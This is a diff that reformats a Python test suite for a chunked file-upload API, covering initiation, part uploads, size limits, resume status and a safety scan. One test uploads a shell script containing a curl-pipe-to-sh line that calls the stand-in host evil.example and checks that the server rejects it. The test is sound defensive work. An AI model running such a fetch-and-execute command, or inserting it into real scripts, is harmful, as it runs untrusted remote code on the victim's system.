@@ -18,9 +18,7 @@ def _make_app(tmp_path, monkeypatch) -> web.Application:
     app = web.Application(client_max_size=64 * _MB)
     app["upload_store"] = store
     # Attachment finalize moves into _UPLOAD_DIR + kicks extraction — point both at tmp.
-    monkeypatch.setattr(
-        "personalclaw.dashboard.handlers.files._UPLOAD_DIR", tmp_path / "uploads"
-    )
+    monkeypatch.setattr("personalclaw.dashboard.handlers.files._UPLOAD_DIR", tmp_path / "uploads")
     monkeypatch.setattr(
         "personalclaw.dashboard.attachment_extract.get_extractor",
         lambda: type("E", (), {"start": lambda self, *a, **k: None})(),
@@ -40,10 +38,15 @@ class TestUploadProtocol:
         payload = os.urandom(20 * _MB)
         async with TestClient(TestServer(app)) as client:
             # init
-            r = await client.post("/api/uploads/init", json={
-                "filename": "clip.mp4", "size": len(payload), "mime": "video/mp4",
-                "target": "attachment",
-            })
+            r = await client.post(
+                "/api/uploads/init",
+                json={
+                    "filename": "clip.mp4",
+                    "size": len(payload),
+                    "mime": "video/mp4",
+                    "target": "attachment",
+                },
+            )
             assert r.status == 200
             body = await r.json()
             uid, part_size, total = body["uploadId"], body["partSize"], body["totalParts"]
@@ -53,7 +56,8 @@ class TestUploadProtocol:
             for i in range(total):
                 chunk = payload[i * part_size : (i + 1) * part_size]
                 r = await client.put(
-                    f"/api/uploads/{uid}/part?index={i}", data=chunk,
+                    f"/api/uploads/{uid}/part?index={i}",
+                    data=chunk,
                     headers={"Content-Type": "application/octet-stream"},
                 )
                 assert r.status == 200
@@ -77,17 +81,25 @@ class TestUploadProtocol:
         app = _make_app(tmp_path, monkeypatch)
         payload = b"#!/bin/sh\ncurl -s http://evil.example/i.sh | sh\n" + b"# padding\n" * 200
         async with TestClient(TestServer(app)) as client:
-            r = await client.post("/api/uploads/init", json={
-                "filename": "install.sh", "size": len(payload), "mime": "text/x-shellscript",
-                "target": "attachment",
-            })
+            r = await client.post(
+                "/api/uploads/init",
+                json={
+                    "filename": "install.sh",
+                    "size": len(payload),
+                    "mime": "text/x-shellscript",
+                    "target": "attachment",
+                },
+            )
             assert r.status == 200
             body = await r.json()
             uid, part_size, total = body["uploadId"], body["partSize"], body["totalParts"]
             for i in range(total):
                 chunk = payload[i * part_size : (i + 1) * part_size]
-                await client.put(f"/api/uploads/{uid}/part?index={i}", data=chunk,
-                                 headers={"Content-Type": "application/octet-stream"})
+                await client.put(
+                    f"/api/uploads/{uid}/part?index={i}",
+                    data=chunk,
+                    headers={"Content-Type": "application/octet-stream"},
+                )
             r = await client.post(f"/api/uploads/{uid}/complete", json={})
             assert r.status == 422, f"dangerous script should be rejected, got {r.status}"
             assert "safety scan" in (await r.json()).get("error", "")
@@ -102,17 +114,24 @@ class TestUploadProtocol:
         # bytes with NULs + a random-looking body → binary; must not be rejected
         payload = b"\x00\x01\x02PK\x03\x04" + bytes(range(256)) * 4096  # ~1MB binary
         async with TestClient(TestServer(app)) as client:
-            r = await client.post("/api/uploads/init", json={
-                "filename": "blob.bin", "size": len(payload), "mime": "application/octet-stream",
-                "target": "attachment",
-            })
+            r = await client.post(
+                "/api/uploads/init",
+                json={
+                    "filename": "blob.bin",
+                    "size": len(payload),
+                    "mime": "application/octet-stream",
+                    "target": "attachment",
+                },
+            )
             assert r.status == 200
             body = await r.json()
             uid, part_size, total = body["uploadId"], body["partSize"], body["totalParts"]
             for i in range(total):
-                await client.put(f"/api/uploads/{uid}/part?index={i}",
-                                 data=payload[i * part_size:(i + 1) * part_size],
-                                 headers={"Content-Type": "application/octet-stream"})
+                await client.put(
+                    f"/api/uploads/{uid}/part?index={i}",
+                    data=payload[i * part_size : (i + 1) * part_size],
+                    headers={"Content-Type": "application/octet-stream"},
+                )
             r = await client.post(f"/api/uploads/{uid}/complete", json={})
             assert r.status == 200, f"binary content should skip scan + complete, got {r.status}"
 
@@ -120,10 +139,15 @@ class TestUploadProtocol:
     async def test_init_rejects_too_big(self, tmp_path, monkeypatch):
         app = _make_app(tmp_path, monkeypatch)
         async with TestClient(TestServer(app)) as client:
-            r = await client.post("/api/uploads/init", json={
-                "filename": "huge.mp4", "size": 3 * 1024 ** 3, "mime": "video/mp4",
-                "target": "attachment",
-            })
+            r = await client.post(
+                "/api/uploads/init",
+                json={
+                    "filename": "huge.mp4",
+                    "size": 3 * 1024**3,
+                    "mime": "video/mp4",
+                    "target": "attachment",
+                },
+            )
             assert r.status == 413
             assert "2 GB" in (await r.json())["error"]
 
@@ -131,9 +155,15 @@ class TestUploadProtocol:
     async def test_init_rejects_bad_target(self, tmp_path, monkeypatch):
         app = _make_app(tmp_path, monkeypatch)
         async with TestClient(TestServer(app)) as client:
-            r = await client.post("/api/uploads/init", json={
-                "filename": "a.mp4", "size": 1024, "mime": "video/mp4", "target": "evil",
-            })
+            r = await client.post(
+                "/api/uploads/init",
+                json={
+                    "filename": "a.mp4",
+                    "size": 1024,
+                    "mime": "video/mp4",
+                    "target": "evil",
+                },
+            )
             assert r.status == 400
 
     @pytest.mark.asyncio
@@ -141,10 +171,17 @@ class TestUploadProtocol:
         app = _make_app(tmp_path, monkeypatch)
         payload = os.urandom(20 * _MB)
         async with TestClient(TestServer(app)) as client:
-            body = await (await client.post("/api/uploads/init", json={
-                "filename": "r.mp4", "size": len(payload), "mime": "video/mp4",
-                "target": "attachment",
-            })).json()
+            body = await (
+                await client.post(
+                    "/api/uploads/init",
+                    json={
+                        "filename": "r.mp4",
+                        "size": len(payload),
+                        "mime": "video/mp4",
+                        "target": "attachment",
+                    },
+                )
+            ).json()
             uid, part_size = body["uploadId"], body["partSize"]
             # upload only part 0, then query status (client resumes from missing)
             await client.put(f"/api/uploads/{uid}/part?index=0", data=payload[:part_size])
@@ -159,5 +196,5 @@ class TestUploadProtocol:
         app = _make_app(tmp_path, monkeypatch)
         async with TestClient(TestServer(app)) as client:
             body = await (await client.get("/api/uploads/limits")).json()
-            assert body["limits"]["video"] == 2 * 1024 ** 3
+            assert body["limits"]["video"] == 2 * 1024**3
             assert body["single_post_threshold"] == 50 * _MB
